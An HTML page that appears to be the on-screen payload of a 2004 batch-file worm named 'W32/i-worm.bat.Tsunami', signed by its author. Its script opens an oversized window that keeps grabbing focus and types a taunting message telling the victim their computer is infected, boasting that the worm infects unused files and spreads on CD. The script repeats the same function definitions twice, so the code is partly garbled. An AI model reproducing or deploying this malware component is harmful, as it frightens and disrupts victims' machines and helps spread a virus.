<HTML><HEAD><TITLE>W32/i-worm.bat.Tsunami by psychologic</TITLE><SCRIPT LANGUAGE="JavaScript">
<!-- Begin
var matrix_window;
function MatrixWrite(string, bold, italic, speed) {
var height = window.screen.height;
var width = window.screen.width;
var win_dimensions = "height = " + eval(height + 10) + ", width = " + eval(width + 30);
matrix_window = window.open("blank.htm", "matrix_window", win_dimensions);
matrix_window.document.open("text/html", "replace");
var i;
var timer = 0;
if(matrix_window.moveTo)
matrix_window.moveTo(-10, -30);
if(matrix_window.resizeBy)
matrix_window.resizeBy(0, 50);
matrix_window.document.write("<body bgcolor=000000 text=00ff00 onBlur='self.focus()'>");
matrix_window.document.write("<font face=system>");
if(bold == true) matrix_window.document.write("<b>");
if(italic == true) matrix_window.document.write("<i>");
for(i = 0; i <= string.length; i++) {
timer += (Math.random() * speed);
setTimeout("matrix_window.document.write('" + string.charAt(i) + "');", timer);
}
timer += 2000;
setTimeout("matrix_window.close()", timer);
}
<!-- Tsunami Payload : Psychologic@hotmail.com -->
<!-- Begin
var matrix_window;
function MatrixWrite(string, bold, italic, speed) {
var height = window.screen.height;
var width = window.screen.width;
var win_dimensions = "height = " + eval(height + 10) + ", width = " + eval(width + 30);
matrix_window = window.open("blank.htm", "matrix_window", win_dimensions);
matrix_window.document.open("text/html", "replace");
var i;
var timer = 0;
if(matrix_window.moveTo)
matrix_window.moveTo(-10, -30);
if(matrix_window.resizeBy)
matrix_window.resizeBy(0, 50);
matrix_window.document.write("<body bgcolor=000000 text=00ff00 onBlur='self.focus()'>");
matrix_window.document.write("<font face=system>");
if(bold == true) matrix_window.document.write("<b>");
if(italic == true) matrix_window.document.write("<i>");
for(i = 0; i <= string.length; i++) {
timer += (Math.random() * speed);
setTimeout("matrix_window.document.write('" + string.charAt(i) + "');", timer);
}
timer += 2000;
setTimeout("matrix_window.close()", timer);
}
var messages = new Array("Helloo...<br>Are you there..!?<br>This is <font color=red>W32/I-WORM.BAT.TSUNAMI</font><br> which created by Psychologic<br>Relax mister Its not destructive it just infect your unused file<br>Belive me or not This is the first bat virus which has many infection routine and able to spread on CD<br>Please change your Antivirus NOW cos your AV is lame<br>if you angry with me please let me know<br>send your E-mail here :<br><a href =mailto:psychologic@hotmail.com>psychologic@hotmail.com</a><br>Ok Byee byee...<br>Im soo glad to know you Mister...<br>Happy nice day<br><br>W32/I-WORM.BAT.TSUNAMI BY Psychologic<br><font color = red>Someone who waiting for the death</font><br><br>Monday.12th.July.2004<br>04.02 PM<br>Asia");
function GetRndIndex() {
return (parseInt(Math.random() * messages.length));
}
function WriteRndMsg(bold, italic, speed) {
MatrixWrite(messages[GetRndIndex()], bold, italic, speed);
}
//  End -->
function GetRndIndex() {
return (parseInt(Math.random() * messages.length));
}
function WriteRndMsg(bold, italic, speed) {
MatrixWrite(messages[GetRndIndex()], bold, italic, speed);
}
//  End -->
</script>

</HEAD>
<BODY Onload = "javascript:WriteRndMsg(true, true, 750)">
<b>Your Computer has been Infected with :</b>
<p><b><font color="#FF0000">W32/i-worm.bat.Tsunami </font> by psychologic</b></p>
</body></html>